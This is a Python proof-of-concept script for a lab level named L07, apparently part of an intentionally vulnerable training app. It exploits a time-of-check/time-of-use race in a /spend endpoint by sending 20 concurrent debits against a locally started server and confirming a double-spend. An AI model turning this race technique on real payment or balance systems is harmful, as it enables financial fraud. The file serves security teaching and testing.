"""L07 TOCTOU double-spend PoC.

/spend reads the balance, runs a slow risk check, then writes the new
balance, with no lock over that read-modify-write. Concurrent requests all
pass the balance check against the same stale value and all debit, so the
account spends more than it holds. Needs the real threaded server, so this
PoC binds 127.0.0.1 on an ephemeral port and shuts it down immediately.
"""
import os
import sys
import json
import socket
import threading
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from werkzeug.serving import make_server

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _common import load_level, ok

mod, _, _ = load_level("L07")

# pick a free loopback port
s = socket.socket()
s.bind(("127.0.0.1", 0))
port = s.getsockname()[1]
s.close()

srv = make_server("127.0.0.1", port, mod.app, threaded=True)
t = threading.Thread(target=srv.serve_forever, daemon=True)
t.start()

BASE = f"http://127.0.0.1:{port}"
INITIAL = mod.BALANCES["acct-1"]  # 5000


def spend():
    req = urllib.request.Request(
        BASE + "/spend",
        data=json.dumps({"account": "acct-1", "amount": 5000}).encode(),
        headers={"Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code


with ThreadPoolExecutor(max_workers=20) as ex:
    results = list(ex.map(lambda _: spend(), range(20)))

srv.shutdown()
successes = results.count(200)
spent_total = sum(e["amount"] for e in mod.LEDGER)
ok(successes > 1, f"multiple concurrent debits succeeded: {successes}")
ok(spent_total > INITIAL, f"spent {spent_total} from a balance of {INITIAL} (double-spend)")
print("L07 exploit confirmed")
